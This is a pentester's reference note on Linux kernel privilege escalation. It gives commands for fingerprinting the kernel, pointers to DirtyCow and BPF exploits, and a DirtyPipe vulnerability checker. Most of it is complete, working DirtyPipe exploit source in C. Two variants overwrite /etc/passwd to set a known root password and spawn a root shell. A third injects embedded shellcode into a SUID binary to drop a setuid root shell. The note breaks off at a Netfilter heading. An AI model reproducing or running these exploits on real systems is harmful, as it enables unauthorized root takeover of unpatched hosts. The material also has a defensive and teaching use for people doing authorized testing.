---
id: Kernel Exploits
aliases: []
tags:
  - Linux/Privesc/Kernel-Exploit
links: "[[Linux/Privesc/General]]"
---

# Kernel Exploit

If a host is not being maintained and running an unpatched
or old operating system, potential kernel vulnerabilities may exist

<!-- Danger {{{-->
> [!danger]
>
> Kernel exploits can potentially corrupt the kernel
>
<!-- }}} -->

___

<!-- Enumerate {{{-->
## Enumerate

Enumerate kernel version

```sh
uname -r
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> uname -r
> ```
> ```
> 6.16.8+kali-amd64
> ```
>
<!-- }}} -->

```sh
uname -a
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> uname -a
> ```
> ```
> Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
> ```
<!-- }}} -->

```sh
cat /proc/version
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> cat /proc/version
> ```
> ```
> Linux version 6.16.8+kali-amd64 (devel@kali.org) (x86_64-linux-gnu-gcc-14 (Debian 14.3.0-8) 14.3.0, GNU ld (GNU Binutils for Debian) 2.45) #1 SMP PREEMPT_DYNAMIC Kali 6.16.8-1kali1 (2025-09-24)
> ```
<!-- }}} -->

```sh
cat /etc/os-release
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> cat /etc/os-release
> ```
> ```
> PRETTY_NAME="Kali GNU/Linux Rolling"
> NAME="Kali GNU/Linux"
> VERSION_ID="2025.4"
> VERSION="2025.4"
> VERSION_CODENAME=kali-rolling
> ID=kali
> ID_LIKE=debian
> HOME_URL="https://www.kali.org/"
> SUPPORT_URL="https://forums.kali.org/"
> BUG_REPORT_URL="https://bugs.kali.org/"
> ANSI_COLOR="1;31"
> ```
<!-- }}} -->

```sh
cat /etc/lsb-release
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> cat /etc/lsb-release
> ```
> ```sh
> DISTRIB_ID=Ubuntu
> DISTRIB_RELEASE=16.04
> DISTRIB_CODENAME=xenial
> DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- Exploits {{{-->
## Exploits

<!-- Public Exploits {{{-->
### Public Exploits

[[SearchSploit]] — Search for public kernel exploits

Binary exploits are located in the `/bin-sploits/` directory

```sh
searchsploit "Linux Kernel"
```

<!-- Tip - Kernel Exploit Lists {{{-->
> [!tip]- Kernel Exploit Lists
>
> - [Exloit DB - Binary Exploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits)
>
> - [GitHub - Kernel exploits](https://github.com/lucyoa/kernel-exploits)
>
> ```sh
> curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null \
> | grep "Kernels: " \
> | cut -d ":" -f 2 \
> | cut -d "<" -f 1 \
> | tr -d "," \
> | tr ' ' '\n' \
> | grep -v "^d\.d$" \
> | sort -u -r
> ```
<!-- }}} -->

<!-- }}} -->

<!-- BPF Sign Extension {{{-->
### BPF Sign Extension

[CVE-2017-16995](https://nvd.nist.gov/vuln/detail/cve-2017-16995) —
Linux Kernel < `4.4.0-116` (*Ubuntu `16.04.4`*)

<!-- Info {{{-->
> [!info]-
>
> An arbitrary memory `r`/`w` access issue was found
> in the Linux kernel compiled with the `eBPF bpf(2)` system call
> (`CONFIG_BPF_SYSCALL`) support.
> The issue could occur due to calculation errors
> in the eBPF verifier module,
> triggered by user supplied malicious BPF program.
>
> An unprivileged user could use this flaw to escalate their privileges on a system.
>
> Setting parameter `kernel.unprivileged_bpf_disabled=1`
> prevents such privilege escalation by restricting access to `bpf(2)` call
<!-- }}} -->

<!-- Exploit {{{-->
> [!tip]- Exploit
>
> - [Exploit-DB](https://www.exploit-db.com/exploits/44298)
> - [Vulners](https://vulners.com/zdt/1337DAY-ID-30003)
<!-- }}} -->

```sh
gcc exploit.c -o exploit && chmod +x exploit
```

```sh
./exploit
```

[[Metasploit]] — [Linux BPF Sign Extension Local Privilege Escalation](https://www.rapid7.com/db/modules/exploit/linux/local/bpf_sign_extension_priv_esc/)

```sh
use exploit/linux/local/bpf_sign_extension_priv_esc
```

<!-- Info {{{-->
> [!info]-
>
> Linux kernel prior to `4.14.8` contains a vulnerability
> in the Berkeley Packet Filter (BPF) verifier
>
> The `check_alu_op` function performs incorrect sign extension
> which allows the verifier to be bypassed,
> leading to arbitrary kernel read/write
>
> The target system must be compiled with BPF support
> and permit unprivileged access to BPF
> with `kernel.unprivileged_bpf_disabled` not set to `1`
<!-- }}} -->

<!-- }}} -->

<!-- DirtyCow {{{-->
### DirtyCow

[CVE-2016-5195](https://nvd.nist.gov/vuln/detail/cve-2016-5195) —
Linux kernel <= `3.19.0`-`73.8`

<!-- Resources {{{-->
> [!info]- Resources
>
> - [Exploit DB - Dirty COW Linux Kernel 2.6.22 < 3.9](https://www.exploit-db.com/exploits/40839)
> - [GitHub - DirtyCow PoCs](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)
>
> Make dirtycow stable
>
> ```sh
> echo 0 > /proc/sys/vm/dirty_writeback_centisecs
> ```
> ```sh
> g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
> ```
> ```sh
> https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
> ```
>
<!-- }}} -->

['Dirty COW /proc/self/mem' Race Condition Privilege Escalation (/etc/passwd Method)](https://www.exploit-db.com/exploits/40847) —
Linux Kernel `2.6.22` < `3.9`

```sh
gcc exploit.c -o exploit && chmod +x exploit
```

```sh
./exploit
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> touch exploit.c
> ```
> ```sh
> vim exploit.c
> ```
> ```sh
> gcc exploit.c -o exploit && chmod +x exploit
> ```
<!-- }}} -->

[Local Privilege Escalation Exploit](https://vulners.com/zdt/1337DAY-ID-30003) —
Linux Kernel `4.4.0-116` (*Ubuntu 16.04.4*)

```sh
gcc exploit.c -o exploit && chmod +x exploit
```

```sh
./exploit
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> task_struct = ffff8800b71d7000
> uidptr = ffff8800b95ce544
> spawning root shell
> ```
<!-- }}} -->

<!-- }}} -->

<!-- DirtyPipe {{{-->
### DirtyPipe

[CVE-2022-0847](https://nvd.nist.gov/vuln/detail/cve-2022-0847) —
Linux kernel `5.8` to `5.17`

<!-- Info {{{-->
> [!info]-
>
> [DirtyPipe](https://dirtypipe.cm4all.com/)
> allows unauthorized writing to root user files
>
> A flaw (*[CVE-2022-0847](https://nvd.nist.gov/vuln/detail/cve-2022-0847)*)
> was found in the way the "flags" member of the new pipe buffer structure
> was lacking proper initialization in `copy_page_to_iter_pipe`
> and `push_pipe` functions in the Linux kernel and could thus contain
> stale values.
>
> An unprivileged local user could use this flaw to write to pages
> in the page cache backed by read only files and as such
> escalate their privileges on the system.
>
>
<!-- }}} -->

[CVE-2022-0847-dirty-pipe-checker](https://github.com/basharkey/CVE-2022-0847-dirty-pipe-checker) —
Enumerate kernel vulnerability

<!-- Tip {{{-->
> [!tip]-
>
> ```sh
> #!/bin/bash
>
> kernel=$1
> ver1=$(echo ${kernel:-$(uname -r | cut -d '-' -f1)} | cut -d '.' -f1)
> ver2=$(echo ${kernel:-$(uname -r | cut -d '-' -f1)} | cut -d '.' -f2)
> ver3=$(echo ${kernel:-$(uname -r | cut -d '-' -f1)} | cut -d '.' -f3)
> echo $ver1 $ver2 $ver3
>
> if (( ${ver1:-0} < 5 )) ||
>    (( ${ver1:-0} > 5 )) ||
>    (( ${ver1:-0} == 5 && ${ver2:-0} < 8 )) ||
>    (( ${ver1:-0} == 5 && ${ver2:-0} == 10 && ${ver3:-0} == 102 )) ||
>    (( ${ver1:-0} == 5 && ${ver2:-0} == 10 && ${ver3:-0} == 92 )) ||
>    (( ${ver1:-0} == 5 && ${ver2:-0} == 15 && ${ver3:-0} == 25 )) ||
>    (( ${ver1:-0} == 5 && ${ver2:-0} >= 16 && ${ver3:-0} >= 11 )) ||
>    (( ${ver1:-0} == 5 && ${ver2:-0} > 16 ));
> then
>     echo [-] Not vulnerable
>     exit 0
> else
>     echo [+] Vulnerable
>     exit 1
> fi
> ```
<!-- }}} -->

```sh
./dpipe.sh
```

<!-- Example {{{-->
> [!example]-
>
>
> Check current kernel
>
> ```sh
> ./dpipe.sh
> ```
>
> Check specific kernel
>
> ```sh
> ./dpipe.sh 5.10.102
> ```
>
<!-- }}} -->

[CM4all - DirtyPipe](https://dirtypipe.cm4all.com/)

<!-- Exploit {{{-->
> [!tip]- Exploit
>
> ```sh
> touch exploit.c
> ```
> ```sh
> vim exploit.c
> ```
>
> ```c
> #define _GNU_SOURCE
> #include <unistd.h>
> #include <fcntl.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/stat.h>
> #include <sys/user.h>
>
> #ifndef PAGE_SIZE
> #define PAGE_SIZE 4096
> #endif
>
> /**
>  * Create a pipe where all "bufs" on the pipe_inode_info ring have the
>  * PIPE_BUF_FLAG_CAN_MERGE flag set.
>  */
> static void prepare_pipe(int p[2])
> {
> 	if (pipe(p)) abort();
>
> 	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
> 	static char buffer[4096];
>
> 	/* fill the pipe completely; each pipe_buffer will now have
> 	   the PIPE_BUF_FLAG_CAN_MERGE flag */
> 	for (unsigned r = pipe_size; r > 0;) {
> 		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
> 		write(p[1], buffer, n);
> 		r -= n;
> 	}
>
> 	/* drain the pipe, freeing all pipe_buffer instances (but
> 	   leaving the flags initialized) */
> 	for (unsigned r = pipe_size; r > 0;) {
> 		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
> 		read(p[0], buffer, n);
> 		r -= n;
> 	}
>
> 	/* the pipe is now empty, and if somebody adds a new
> 	   pipe_buffer without initializing its "flags", the buffer
> 	   will be mergeable */
> }
>
> int main() {
> 	const char *const path = "/etc/passwd";
>
>         printf("Backing up /etc/passwd to /tmp/passwd.bak ...\n");
>         FILE *f1 = fopen("/etc/passwd", "r");
>         FILE *f2 = fopen("/tmp/passwd.bak", "w");
>
>         if (f1 == NULL) {
>             printf("Failed to open /etc/passwd\n");
>             exit(EXIT_FAILURE);
>         } else if (f2 == NULL) {
>             printf("Failed to open /tmp/passwd.bak\n");
>             fclose(f1);
>             exit(EXIT_FAILURE);
>         }
>
>         char c;
>         while ((c = fgetc(f1)) != EOF)
>             fputc(c, f2);
>
>         fclose(f1);
>         fclose(f2);
>
> 	loff_t offset = 4; // after the "root"
> 	const char *const data = ":$1$antx-soc$pIwpJwMMcozsUxAtRa85w.:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt antx-soc antx-soc
>         printf("Setting root password to \"antx-soc\"...\n");
> 	const size_t data_size = strlen(data);
>
> 	if (offset % PAGE_SIZE == 0) {
> 		fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
> 		return EXIT_FAILURE;
> 	}
>
> 	const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
> 	const loff_t end_offset = offset + (loff_t)data_size;
> 	if (end_offset > next_page) {
> 		fprintf(stderr, "Sorry, cannot write across a page boundary\n");
> 		return EXIT_FAILURE;
> 	}
>
> 	/* open the input file and validate the specified offset */
> 	const int fd = open(path, O_RDONLY); // yes, read-only! :-)
> 	if (fd < 0) {
> 		perror("open failed");
> 		return EXIT_FAILURE;
> 	}
>
> 	struct stat st;
> 	if (fstat(fd, &st)) {
> 		perror("stat failed");
> 		return EXIT_FAILURE;
> 	}
>
> 	if (offset > st.st_size) {
> 		fprintf(stderr, "Offset is not inside the file\n");
> 		return EXIT_FAILURE;
> 	}
>
> 	if (end_offset > st.st_size) {
> 		fprintf(stderr, "Sorry, cannot enlarge the file\n");
> 		return EXIT_FAILURE;
> 	}
>
> 	/* create the pipe with all flags initialized with
> 	   PIPE_BUF_FLAG_CAN_MERGE */
> 	int p[2];
> 	prepare_pipe(p);
>
> 	/* splice one byte from before the specified offset into the
> 	   pipe; this will add a reference to the page cache, but
> 	   since copy_page_to_iter_pipe() does not initialize the
> 	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
> 	--offset;
> 	ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
> 	if (nbytes < 0) {
> 		perror("splice failed");
> 		return EXIT_FAILURE;
> 	}
> 	if (nbytes == 0) {
> 		fprintf(stderr, "short splice\n");
> 		return EXIT_FAILURE;
> 	}
>
> 	/* the following write will not create a new pipe_buffer, but
> 	   will instead write into the page cache, because of the
> 	   PIPE_BUF_FLAG_CAN_MERGE flag */
> 	nbytes = write(p[1], data, data_size);
> 	if (nbytes < 0) {
> 		perror("write failed");
> 		return EXIT_FAILURE;
> 	}
> 	if ((size_t)nbytes < data_size) {
> 		fprintf(stderr, "short write\n");
> 		return EXIT_FAILURE;
> 	}
>
> 	char *argv[] = {"/bin/sh", "-c", "(echo antx-soc; cat) | su - -c \""
>                 "echo \\\"Restoring /etc/passwd from /tmp/passwd.bak...\\\";"
>                 "cp /tmp/passwd.bak /etc/passwd;"
>                 "echo \\\"Done! Popping shell... (run commands now)\\\";"
>                 "/bin/sh;"
>             "\" root"};
>         execv("/bin/sh", argv);
>
>         printf("system() function call seems to have failed :(\n");
> 	return EXIT_SUCCESS;
> }
> ```
<!-- }}} -->

```sh
gcc exploit.c -o exploit && chmod +x exploit
```

```sh
./exploit
```

[GitHub - DirtyPipe Exploits](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/tree/main)


```sh
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
```
```sh
cd CVE-2022-0847-DirtyPipe-Exploits
```
```sh
bash compile.sh
```

<!-- Exploit 1 {{{-->
> [!tip]- Exploit 1
>
> ```sh
> touch exploit-1.c
> ```
> ```sh
> vim exploit-1.c
> ```
>
> ```c
> /* SPDX-License-Identifier: GPL-2.0 */
> /*
>  * Copyright 2022 CM4all GmbH / IONOS SE
>  *
>  * author: Max Kellermann <max.kellermann@ionos.com>
>  *
>  * Proof-of-concept exploit for the Dirty Pipe
>  * vulnerability (CVE-2022-0847) caused by an uninitialized
>  * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
>  * file contents in the page cache, even if the file is not permitted
>  * to be written, immutable or on a read-only mount.
>  *
>  * This exploit requires Linux 5.8 or later; the code path was made
>  * reachable by commit f6dd975583bd ("pipe: merge
>  * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
>  * there before, it just provided an easy way to exploit it.
>  *
>  * There are two major limitations of this exploit: the offset cannot
>  * be on a page boundary (it needs to write one byte before the offset
>  * to add a reference to this page to the pipe), and the write cannot
>  * cross a page boundary.
>  *
>  * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
>  *
>  * Further explanation: https://dirtypipe.cm4all.com/
>  */
>
> #define _GNU_SOURCE
> #include <unistd.h>
> #include <fcntl.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/stat.h>
> #include <sys/user.h>
>
> #ifndef PAGE_SIZE
> #define PAGE_SIZE 4096
> #endif
>
> /**
>  * Create a pipe where all "bufs" on the pipe_inode_info ring have the
>  * PIPE_BUF_FLAG_CAN_MERGE flag set.
>  */
> static void prepare_pipe(int p[2])
> {
> 	if (pipe(p)) abort();
>
> 	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
> 	static char buffer[4096];
>
> 	/* fill the pipe completely; each pipe_buffer will now have
> 	   the PIPE_BUF_FLAG_CAN_MERGE flag */
> 	for (unsigned r = pipe_size; r > 0;) {
> 		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
> 		write(p[1], buffer, n);
> 		r -= n;
> 	}
>
> 	/* drain the pipe, freeing all pipe_buffer instances (but
> 	   leaving the flags initialized) */
> 	for (unsigned r = pipe_size; r > 0;) {
> 		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
> 		read(p[0], buffer, n);
> 		r -= n;
> 	}
>
> 	/* the pipe is now empty, and if somebody adds a new
> 	   pipe_buffer without initializing its "flags", the buffer
> 	   will be mergeable */
> }
>
> int main() {
> 	const char *const path = "/etc/passwd";
>
>         printf("Backing up /etc/passwd to /tmp/passwd.bak ...\n");
>         FILE *f1 = fopen("/etc/passwd", "r");
>         FILE *f2 = fopen("/tmp/passwd.bak", "w");
>
>         if (f1 == NULL) {
>             printf("Failed to open /etc/passwd\n");
>             exit(EXIT_FAILURE);
>         } else if (f2 == NULL) {
>             printf("Failed to open /tmp/passwd.bak\n");
>             fclose(f1);
>             exit(EXIT_FAILURE);
>         }
>
>         char c;
>         while ((c = fgetc(f1)) != EOF)
>             fputc(c, f2);
>
>         fclose(f1);
>         fclose(f2);
>
> 	loff_t offset = 4; // after the "root"
> 	const char *const data = ":$6$root$xgJsQ7yaob86QFGQQYOK0UUj.tXqKn0SLwPRqCaLs19pqYr0p1euYYLqIC6Wh2NyiiZ0Y9lXJkClRiZkeB/Q.0:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt root piped 
>         printf("Setting root password to \"piped\"...\n");
> 	const size_t data_size = strlen(data);
>
> 	if (offset % PAGE_SIZE == 0) {
> 		fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
> 		return EXIT_FAILURE;
> 	}
>
> 	const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
> 	const loff_t end_offset = offset + (loff_t)data_size;
> 	if (end_offset > next_page) {
> 		fprintf(stderr, "Sorry, cannot write across a page boundary\n");
> 		return EXIT_FAILURE;
> 	}
>
> 	/* open the input file and validate the specified offset */
> 	const int fd = open(path, O_RDONLY); // yes, read-only! :-)
> 	if (fd < 0) {
> 		perror("open failed");
> 		return EXIT_FAILURE;
> 	}
>
> 	struct stat st;
> 	if (fstat(fd, &st)) {
> 		perror("stat failed");
> 		return EXIT_FAILURE;
> 	}
>
> 	if (offset > st.st_size) {
> 		fprintf(stderr, "Offset is not inside the file\n");
> 		return EXIT_FAILURE;
> 	}
>
> 	if (end_offset > st.st_size) {
> 		fprintf(stderr, "Sorry, cannot enlarge the file\n");
> 		return EXIT_FAILURE;
> 	}
>
> 	/* create the pipe with all flags initialized with
> 	   PIPE_BUF_FLAG_CAN_MERGE */
> 	int p[2];
> 	prepare_pipe(p);
>
> 	/* splice one byte from before the specified offset into the
> 	   pipe; this will add a reference to the page cache, but
> 	   since copy_page_to_iter_pipe() does not initialize the
> 	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
> 	--offset;
> 	ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
> 	if (nbytes < 0) {
> 		perror("splice failed");
> 		return EXIT_FAILURE;
> 	}
> 	if (nbytes == 0) {
> 		fprintf(stderr, "short splice\n");
> 		return EXIT_FAILURE;
> 	}
>
> 	/* the following write will not create a new pipe_buffer, but
> 	   will instead write into the page cache, because of the
> 	   PIPE_BUF_FLAG_CAN_MERGE flag */
> 	nbytes = write(p[1], data, data_size);
> 	if (nbytes < 0) {
> 		perror("write failed");
> 		return EXIT_FAILURE;
> 	}
> 	if ((size_t)nbytes < data_size) {
> 		fprintf(stderr, "short write\n");
> 		return EXIT_FAILURE;
> 	}
>
> 	char *argv[] = {"/bin/sh", "-c", "(echo piped; cat) | su - -c \""
>                 "echo \\\"Restoring /etc/passwd from /tmp/passwd.bak...\\\";"
>                 "cp /tmp/passwd.bak /etc/passwd;"
>                 "echo \\\"Done! Popping shell... (run commands now)\\\";"
>                 "/bin/sh;"
>             "\" root"};
>         execv("/bin/sh", argv);
>
>         printf("system() function call seems to have failed :(\n");
> 	return EXIT_SUCCESS;
}
<!-- }}} -->

```sh
gcc exploit-1.c -o exploit-1 && chmod +x exploit-1
```

```sh
./exploit-1
```

<!-- Exploit 2 {{{-->
> [!tip]- Exploit 2
>
> ```sh
> touch exploit-2.c
> ```
> ```sh
> vim exploit-2.c
> ```
>
> ```c
> // dirtypipez.c
> //
> // hacked up Dirty Pipe (CVE-2022-0847) PoC that hijacks a SUID binary to spawn
> // a root shell. (and attempts to restore the damaged binary as well)
> //
> // Wow, Dirty CoW reloaded!
> //
> // -- blasty <peter@haxx.in> // 2022-03-07
> /* SPDX-License-Identifier: GPL-2.0 */
> /*
>  * Copyright 2022 CM4all GmbH / IONOS SE
>  *
>  * author: Max Kellermann <max.kellermann@ionos.com>
>  *
>  * Proof-of-concept exploit for the Dirty Pipe
>  * vulnerability (CVE-2022-0847) caused by an uninitialized
>  * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
>  * file contents in the page cache, even if the file is not permitted
>  * to be written, immutable or on a read-only mount.
>  *
>  * This exploit requires Linux 5.8 or later; the code path was made
>  * reachable by commit f6dd975583bd ("pipe: merge
>  * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
>  * there before, it just provided an easy way to exploit it.
>  *
>  * There are two major limitations of this exploit: the offset cannot
>  * be on a page boundary (it needs to write one byte before the offset
>  * to add a reference to this page to the pipe), and the write cannot
>  * cross a page boundary.
>  *
>  * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
>  *
>  * Further explanation: https://dirtypipe.cm4all.com/
>  */
> #define _GNU_SOURCE
> #include <unistd.h>
> #include <fcntl.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/stat.h>
> #include <sys/user.h>
> #include <stdint.h>
> #ifndef PAGE_SIZE
> #define PAGE_SIZE 4096
> #endif
> // small (linux x86_64) ELF file matroshka doll that does;
> //   fd = open("/tmp/sh", O_WRONLY | O_CREAT | O_TRUNC);
> //   write(fd, elfcode, elfcode_len)
> //   chmod("/tmp/sh", 04755)
> //   close(fd);
> //   exit(0);
> //
> // the dropped ELF simply does:
> //   setuid(0);
> //   setgid(0);
> //   execve("/bin/sh", ["/bin/sh", NULL], [NULL]);
> unsigned char elfcode[] = {
>     /*0x7f,*/ 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
>     0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
>     0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
>     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
>     0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
>     0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
>     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
>     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
>     0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00,
>     0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
>     0x48, 0x8d, 0x3d, 0x56, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0x41, 0x02,
>     0x00, 0x00, 0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48,
>     0x89, 0xc7, 0x48, 0x8d, 0x35, 0x44, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2,
>     0xba, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0x0f,
>     0x05, 0x48, 0xc7, 0xc0, 0x03, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d,
>     0x3d, 0x1c, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0xed, 0x09, 0x00, 0x00,
>     0x48, 0xc7, 0xc0, 0x5a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff,
>     0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x2f, 0x74, 0x6d,
>     0x70, 0x2f, 0x73, 0x68, 0x00, 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01,
>     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e,
>     0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00,
>     0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
>     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38,
>     0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
>     0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
>     0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
>     0x00, 0x00, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
>     0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00,
>     0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x69,
>     0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x6a,
>     0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x1b, 0x00, 0x00, 0x00,
>     0x6a, 0x00, 0x48, 0x89, 0xe2, 0x57, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc0,
>     0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00,
>     0x00, 0x0f, 0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00
> };
> /**
>  * Create a pipe where all "bufs" on the pipe_inode_info ring have the
>  * PIPE_BUF_FLAG_CAN_MERGE flag set.
>  */
> static void prepare_pipe(int p[2])
> {
>     if (pipe(p)) abort();
>     const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
>     static char buffer[4096];
>     /* fill the pipe completely; each pipe_buffer will now have
>        the PIPE_BUF_FLAG_CAN_MERGE flag */
>     for (unsigned r = pipe_size; r > 0;) {
>         unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
>         write(p[1], buffer, n);
>         r -= n;
>     }
>     /* drain the pipe, freeing all pipe_buffer instances (but
>        leaving the flags initialized) */
>     for (unsigned r = pipe_size; r > 0;) {
>         unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
>         read(p[0], buffer, n);
>         r -= n;
>     }
>     /* the pipe is now empty, and if somebody adds a new
>        pipe_buffer without initializing its "flags", the buffer
>        will be mergeable */
> }
> int hax(char *filename, long offset, uint8_t *data, size_t len) {
>     /* open the input file and validate the specified offset */
>     const int fd = open(filename, O_RDONLY); // yes, read-only! :-)
>     if (fd < 0) {
>         perror("open failed");
>         return -1;
>     }
>     struct stat st;
>     if (fstat(fd, &st)) {
>         perror("stat failed");
>         return -1;
>     }
>     /* create the pipe with all flags initialized with
>        PIPE_BUF_FLAG_CAN_MERGE */
>     int p[2];
>     prepare_pipe(p);
>     /* splice one byte from before the specified offset into the
>        pipe; this will add a reference to the page cache, but
>        since copy_page_to_iter_pipe() does not initialize the
>        "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
>     --offset;
>     ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
>     if (nbytes < 0) {
>         perror("splice failed");
>         return -1;
>     }
>     if (nbytes == 0) {
>         fprintf(stderr, "short splice\n");
>         return -1;
>     }
>     /* the following write will not create a new pipe_buffer, but
>        will instead write into the page cache, because of the
>        PIPE_BUF_FLAG_CAN_MERGE flag */
>     nbytes = write(p[1], data, len);
>     if (nbytes < 0) {
>         perror("write failed");
>         return -1;
>     }
>     if ((size_t)nbytes < len) {
>         fprintf(stderr, "short write\n");
>         return -1;
>     }
>     close(fd);
>     return 0;
> }
> int main(int argc, char **argv) {
>     if (argc != 2) {
>         fprintf(stderr, "Usage: %s SUID\n", argv[0]);
>         return EXIT_FAILURE;
>     }
>     char *path = argv[1];
>     uint8_t *data = elfcode;
>     int fd = open(path, O_RDONLY);
>     uint8_t *orig_bytes = malloc(sizeof(elfcode));
>     lseek(fd, 1, SEEK_SET);
>     read(fd, orig_bytes, sizeof(elfcode));
>     close(fd);
>     printf("[+] hijacking suid binary..\n");
>     if (hax(path, 1, elfcode, sizeof(elfcode)) != 0) {
>         printf("[~] failed\n");
>         return EXIT_FAILURE;
>     }
>     printf("[+] dropping suid shell..\n");
>     system(path);
>     printf("[+] restoring suid binary..\n");
>     if (hax(path, 1, orig_bytes, sizeof(elfcode)) != 0) {
>         printf("[~] failed\n");
>         return EXIT_FAILURE;
>     }
>     printf("[+] popping root shell.. (dont forget to clean up /tmp/sh ;))\n");
>     system("/tmp/sh");
>     return EXIT_SUCCESS;
}
<!-- }}} -->

```sh
gcc exploit-2.c -o exploit-2 && chmod +x exploit-2
```

```sh
./exploit-1
```

<!-- }}} -->

<!-- Netfilter {{{-->
### Netfilter

Escalate privileges via [[Netfilter]] vulnerabilities

[CVE-2021-22555](https://nvd.nist.gov/vuln/detail/cve-2021-22555) —
